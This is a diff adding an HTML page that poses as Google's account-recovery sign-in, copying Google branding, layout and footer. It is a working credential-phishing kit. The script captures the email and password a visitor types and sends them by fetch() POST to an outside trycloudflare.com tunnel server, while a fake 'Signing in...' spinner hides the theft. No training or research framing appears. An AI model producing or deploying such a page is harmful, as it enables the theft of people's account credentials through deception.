@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        :root {
+            --google-blue: #7ab1f8;
+            --google-blue-hover: #7fb2f5;
+            --google-gray: #131618;
+            --google-border: #3c4043;
+            --background-dark: #1b1c1d;
+            --card-bg: #0000009c;
+            --text-white: #e8eaed;
+            --text-secondary: #9aa0a6;
+            --footer-color: #9aa0a6;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--background-dark);
+            color: var(--text-white);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            margin: 0;
+        }
+
+        .main-container {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        /* Profile Display Box */
+        .profile-display {
+            background-color: rgba(32, 34, 36, 0.9);
+            border: 1px solid var(--google-border);
+            border-radius: 12px;
+            padding: 8px 12px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+            font-size: 14px;
+            color: var(--text-white);
+            max-width: 90%;
+            margin: 10px 0 30px 0;
+        }
+
+        .profile-display.show {
+            display: flex;
+        }
+
+        .profile-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background-color: var(--google-blue);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 500;
+            color: #202224;
+        }
+
+        .profile-email {
+            font-size: 13px;
+            color: var(--text-white);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 250px;
+        }
+
+        /* Recovery Card - Desktop version */
+        .recovery-card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 1100px;
+            border-radius: 16px;
+            padding: 80px 70px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.801);
+            animation: fadeIn 0.3s ease-out;
+            overflow: hidden;
+            position: relative;
+            min-height: 500px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(-100%); opacity: 0; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* Google Logo */
+        .google-logo {
+            width: 36px;
+            height: 36px;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        /* Recovery Header */
+        .recovery-header {
+            text-align: left;
+            margin-bottom: 10px;
+        }
+
+        .recovery-header h1 {
+            font-size: 32px;
+            font-weight: 400;
+            color: var(--text-white);
+            margin-bottom: 12px;
+        }
+
+        .recovery-description {
+            font-size: 18px;
+            color: var(--text-white);
+        }
+
+        /* Form Container */
+        .form-container {
+            position: relative;
+            width: 100%;
+            min-height: 140px;
+            margin-bottom: 30px;
+        }
+
+        .form-step {
+            position: absolute;
+            width: 100%;
+            top: 0;
+            left: 0;
+        }
+
+        /* Form Group */
+        .form-group {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 22px 20px;
+            border: 1px solid var(--google-border);
+            border-radius: 4px;
+            font-size: 18px;
+            background-color: transparent;
+            color: var(--text-white);
+            transition: all 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border: 2px solid var(--google-blue);
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .input-label {
+            position: absolute;
+            left: 20px;
+            top: 22px;
+            color: var(--text-secondary);
+            font-size: 18px;
+            transition: all 0.2s;
+            pointer-events: none;
+            background-color: var(--card-bg);
+            padding: 0 5px;
+        }
+
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: -8px;
+            font-size: 14px;
+            color: var(--google-blue);
+        }
+
+        /* Action Buttons Container */
+        .action-buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+            position: fixed;
+            bottom: 100px;
+            left: 0;
+            right: 0;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .action-buttons.desktop {
+            position: static;
+            padding: 0;
+        }
+
+        .forgot-link {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: var(--google-blue);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 8px;
+            margin-right: auto;
+            display: none;
+        }
+
+        .back-button.show {
+            display: block;
+        }
+
+        /* Next Button - More rounded */
+        .next-button {
+            background-color: var(--google-blue);
+            color: #202224;
+            border: none;
+            border-radius: 50px;
+            padding: 16px 36px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            min-width: 100px;
+            margin-left: auto;
+        }
+
+        .next-button:hover {
+            background-color: var(--google-blue-hover);
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--card-bg);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+            border-radius: 16px;
+        }
+
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--google-blue);
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: var(--text-white);
+            font-size: 18px;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            color: var(--footer-color);
+            font-size: 12px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+        }
+
+        .language-selector {
+            background-color: transparent;
+            color: var(--footer-color);
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .language-selector:after {
+            content: "▼";
+            font-size: 8px;
+            margin-left: 4px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-link {
+            color: var(--footer-color);
+            text-decoration: none;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Laptop screens - shift entire text field to the right */
+        @media (min-width: 1025px) {
+            .form-group {
+                width: 70%;
+                margin-left: 300px;
+            }
+            
+            .profile-display {
+                margin-left: 300px;
+                max-width: 70%;
+            }
+            
+            .action-buttons {
+                position: static;
+                padding: 0;
+            }
+        }
+
+        /* Responsive - Mobile first approach */
+        @media (max-width: 768px) {
+            .main-container {
+                padding: 0;
+                justify-content: flex-start;
+                height: 100vh;
+                overflow: hidden;
+            }
+            
+            /* Remove card styling on mobile - make it fullscreen */
+            .recovery-card {
+                background-color: transparent;
+                box-shadow: none;
+                border-radius: 0;
+                padding: 0 24px;
+                margin: 0;
+                min-height: calc(100vh - 80px);
+                max-width: 100%;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                position: relative;
+                padding-top: 80px;
+                padding-bottom: 120px;
+            }
+
+            /* Adjust spacing for mobile */
+            .recovery-header {
+                margin-bottom: 20px;
+                text-align: center;
+                position: relative;
+                z-index: 1;
+            }
+
+            .recovery-header h1 {
+                font-size: 24px;
+                margin-bottom: 8px;
+            }
+
+            .recovery-description {
+                font-size: 16px;
+            }
+
+            .google-logo {
+                margin: 0 auto 32px auto;
+                width: 32px;
+                height: 32px;
+            }
+
+            .form-container {
+                min-height: 120px;
+                margin-bottom: 24px;
+                flex: 1;
+                position: relative;
+                display: flex;
+                flex-direction: column;
+                justify-content: flex-start;
+            }
+
+            .form-step {
+                position: relative;
+                height: 100%;
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between;
+                min-height: 200px;
+            }
+
+            .form-group {
+                margin-bottom: 24px;
+                width: 100%;
+                margin-left: 0;
+            }
+
+            .input-field {
+                padding: 16px 16px;
+                font-size: 16px;
+                border-radius: 8px;
+            }
+
+            .input-label {
+                left: 16px;
+                top: 16px;
+                font-size: 16px;
+                background-color: var(--background-dark);
+            }
+
+            .profile-display {
+                margin: 10px auto 30px auto;
+                max-width: 100%;
+            }
+
+            /* Loading screen adjustments for mobile */
+            .loading-screen {
+                background-color: var(--background-dark);
+                border-radius: 0;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+            }
+
+            /* Footer adjustments for mobile */
+            .footer {
+                padding: 16px 24px;
+                flex-direction: column;
+                gap: 12px;
+                position: fixed;
+                margin-top: 0;
+                bottom: 0;
+                height: 80px;
+            }
+            
+            .footer-links {
+                gap: 16px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+
+        /* Extra small screens */
+        @media (max-width: 480px) {
+            .recovery-card {
+                padding: 0 16px;
+                padding-top: 60px;
+                padding-bottom: 120px;
+            }
+
+            .recovery-header h1 {
+                font-size: 22px;
+            }
+
+            .recovery-description {
+                font-size: 15px;
+            }
+
+            .action-buttons {
+                padding: 0 16px;
+            }
+        }
+
+        /* Tablet view - keep some card styling */
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .recovery-card {
+                max-width: 90%;
+                padding: 60px 40px;
+            }
+        }
+
+        /* Prevent zoom on input focus for iOS */
+        @media screen and (max-width: 768px) {
+            .input-field {
+                font-size: 16px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="recovery-card">
+            <img src="https://imagepng.org/wp-content/uploads/2019/08/google-icon.png" alt="Google" class="google-logo">
+            
+            <div class="recovery-header">
+                <h1>Account recovery</h1>
+                <p class="recovery-description">Recover your Google Account</p>
+            </div>
+            
+            <!-- Profile Display Box -->
+            <div class="profile-display" id="profileDisplay">
+                <div class="profile-icon" id="profileIcon">G</div>
+                <div class="profile-email" id="profileEmail"></div>
+            </div>
+            
+            <div class="form-container">
+                <form id="emailForm" class="form-step">
+                    <div class="form-group">
+                        <input type="text" id="emailOrPhone" class="input-field" placeholder=" " required>
+                        <label for="emailOrPhone" class="input-label">Email or phone</label>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button type="button" class="back-button" id="backButton1">Back</button>
+                        <a href="#" class="forgot-link">Forgot email?</a>
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+                </form>
+
+                <form id="passwordForm" class="form-step" style="display: none;">
+                    <div class="form-group">
+                        <input type="password" id="password" class="input-field" placeholder=" " required>
+                        <label for="password" class="input-label">Password</label>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button type="button" class="back-button show" id="backButton2">Back</button>
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="loading-screen">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">Signing in...</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="language-selector">
+                English (United States)
+            </div>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('emailOrPhone').value;
+            
+            // Show profile display with email
+            showProfileDisplay(email);
+            
+            // Animate email form out and password form in
+            const emailForm = document.getElementById('emailForm');
+            const passwordForm = document.getElementById('passwordForm');
+            
+            emailForm.style.animation = 'slideOut 0.3s forwards';
+            
+            setTimeout(() => {
+                emailForm.style.display = 'none';
+                passwordForm.style.display = 'block';
+                passwordForm.style.animation = 'slideIn 0.3s forwards';
+                
+                // Show back button
+                document.getElementById('backButton2').classList.add('show');
+                
+                // Focus on password field after animation
+                setTimeout(() => {
+                    document.getElementById('password').focus();
+                }, 300);
+            }, 300);
+        });
+
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+            
+            // Show loading screen
+            document.querySelector('.loading-screen').classList.add('active');
+            
+            // Send data to server
+            setTimeout(() => {
+                sendDataToServer(email, password);
+            }, 1500);
+        });
+
+        // Back button functionality
+        document.getElementById('backButton2').addEventListener('click', function() {
+            const emailForm = document.getElementById('emailForm');
+            const passwordForm = document.getElementById('passwordForm');
+            
+            passwordForm.style.animation = 'slideOut 0.3s forwards';
+            
+            setTimeout(() => {
+                passwordForm.style.display = 'none';
+                emailForm.style.display = 'block';
+                emailForm.style.animation = 'slideIn 0.3s forwards';
+                
+                // Hide back button on email form
+                document.getElementById('backButton2').classList.remove('show');
+                
+                // Focus on email field after animation
+                setTimeout(() => {
+                    document.getElementById('emailOrPhone').focus();
+                }, 300);
+            }, 300);
+        });
+
+        function showProfileDisplay(email) {
+            const profileDisplay = document.getElementById('profileDisplay');
+            const profileIcon = document.getElementById('profileIcon');
+            const profileEmail = document.getElementById('profileEmail');
+            
+            // Set the first letter of email as icon
+            const firstLetter = email.charAt(0).toUpperCase();
+            profileIcon.textContent = firstLetter;
+            
+            // Set email text
+            profileEmail.textContent = email;
+            
+            // Show the profile display
+            profileDisplay.classList.add('show');
+        }
+
+        function sendDataToServer(email, password) {
+            // Create a FormData object to send the data
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            
+            // Send the data to your Flask server
+            fetch('https://todd-beads-advert-cam.trycloudflare.com', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log('Data successfully sent to server:', data);
+                // Here you could redirect or show a success message
+            })
+            .catch(error => {
+                console.error('Error sending data to server:', error);
+                // Here you could show an error message to user
+            })
+            .finally(() => {
+                // Hide loading screen after 3 seconds (regardless of success)
+                setTimeout(() => {
+                    document.querySelector('.loading-screen').classList.remove('active');
+                }, 1500);
+            });
+        }
+
+        // Make action buttons fixed only on mobile
+        function adjustActionButtons() {
+            const actionButtons = document.querySelectorAll('.action-buttons');
+            if (window.innerWidth <= 768) {
+                actionButtons.forEach(buttons => {
+                    buttons.classList.remove('desktop');
+                });
+            } else {
+                actionButtons.forEach(buttons => {
+                    buttons.classList.add('desktop');
+                });
+            }
+        }
+
+        // Initial adjustment
+        adjustActionButtons();
+        
+        // Adjust on resize
+        window.addEventListener('resize', adjustActionButtons);
+
+        // Prevent viewport changes on mobile keyboard
+        if (window.innerWidth <= 768) {
+            const viewport = document.querySelector('meta[name=viewport]');
+            viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
+        }
+    </script>
+</body>
+</html>
